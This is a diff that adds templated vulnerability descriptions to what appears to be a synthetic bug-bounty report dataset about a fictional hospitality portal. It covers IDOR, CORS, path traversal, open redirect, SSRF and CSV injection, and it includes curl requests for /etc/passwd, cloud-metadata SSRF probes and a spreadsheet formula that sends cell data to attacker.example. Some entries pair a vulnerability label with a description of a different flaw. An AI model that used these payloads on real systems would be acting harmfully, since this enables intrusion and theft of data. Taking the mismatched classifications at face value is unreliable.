+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8976,7 +9043,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenblick-hospitality.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9111,7 +9179,8 @@
           "offset": "6d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9239,7 +9308,8 @@
           "offset": "1d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9354,7 +9424,8 @@
           "offset": "14h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9469,7 +9540,8 @@
           "offset": "2d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9593,7 +9665,8 @@
           "offset": "2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.alpenblick-hospitality.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9747,7 +9820,8 @@
           "offset": "6d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9890,7 +9964,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.alpenblick-hospitality.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10018,7 +10093,8 @@
           "offset": "1d 22h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.alpenblick-hospitality.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10162,7 +10238,8 @@
           "offset": "15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.alpenblick-hospitality.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10291,7 +10368,8 @@
           "offset": "9d",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10443,7 +10521,8 @@
           "offset": "3d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10607,7 +10686,8 @@
           "offset": "4d 17h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10743,7 +10823,8 @@
           "offset": "2d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10827,7 +10908,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10953,7 +11035,8 @@
           "offset": "2d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11088,7 +11171,8 @@
           "offset": "9d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenblick-hospitality.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11215,7 +11299,8 @@
           "offset": "9d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11341,7 +11426,8 @@
           "offset": "3d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11480,7 +11566,8 @@
           "offset": "3d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11642,7 +11729,8 @@
           "offset": "7d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11798,7 +11886,8 @@
           "offset": "5d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenblick-hospitality.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11945,7 +12034,8 @@
           "offset": "8d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12104,7 +12194,8 @@
           "offset": "5d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.alpenblick-hospitality.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12230,7 +12321,8 @@
           "offset": "4d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.alpenblick-hospitality.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12350,7 +12442,8 @@
           "offset": "3d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenblick-hospitality.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12498,7 +12591,8 @@
           "offset": "1d 15h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.alpenblick-hospitality.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12599,7 +12693,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.alpenblick-hospitality.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12770,7 +12865,8 @@
           "offset": "6d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.alpenblick-hospitality.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12914,7 +13010,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.alpenblick-hospitality.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13066,7 +13163,8 @@
           "offset": "4d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
